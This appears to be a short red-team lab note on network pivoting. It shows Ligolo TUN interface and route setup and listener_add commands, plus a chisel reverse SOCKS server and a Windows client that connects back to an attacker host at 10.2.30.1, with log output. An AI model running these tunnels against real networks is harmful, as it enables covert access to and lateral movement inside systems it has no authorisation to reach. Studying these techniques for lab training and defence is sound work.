
## Ligolo


```python
sudo ip tuntap add user kali mode tun ligolo-inside
sudo ip link set ligolo-inside up
sudo ip route add 10.2.20.0/24 dev ligolo-inside
```



```python
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.2.10.0/24 dev ligolo
```


```
listener_add --addr 10.2.30.1:11601 --to 0.0.0.0:11601 --tcp
```




---

chisel 


```
kali@kali ~/p/chisel> ./chisellinux server --socks5 -p 9001 --reverse
2025/03/10 11:28:10 server: Reverse tunnelling enabled
2025/03/10 11:28:10 server: Fingerprint dhJe3iGvg2J85NXNUPvIbgM1y4SB4LOBbPw1aYBM9HU=
2025/03/10 11:28:10 server: Listening on http://0.0.0.0:9001
2025/03/10 11:29:02 server: session#1: tun: proxy#R:127.0.0.1:9999=>socks: Listening
```


```
c:\temp> .\chisel.exe client 10.2.30.1:9001 R:9999:socks
2025/03/10 23:28:58 client: Connecting to ws://10.2.30.1:9001
2025/03/10 23:29:02 client: Connected (Latency 263.3082ms)
```

.\chisel.exe client 10.8.0.3:9001 R:9999:socks


```
listener_add --addr 10.2.30.1:9001 --to 0.0.0.0:9001 --tcp
```


```
listener_add --addr 10.2.10.15:9002 --to 10.2.30.1:9002 --tcp
```







https://nirajkharel.com.np/posts/red-teaming-pivoting-perspectives/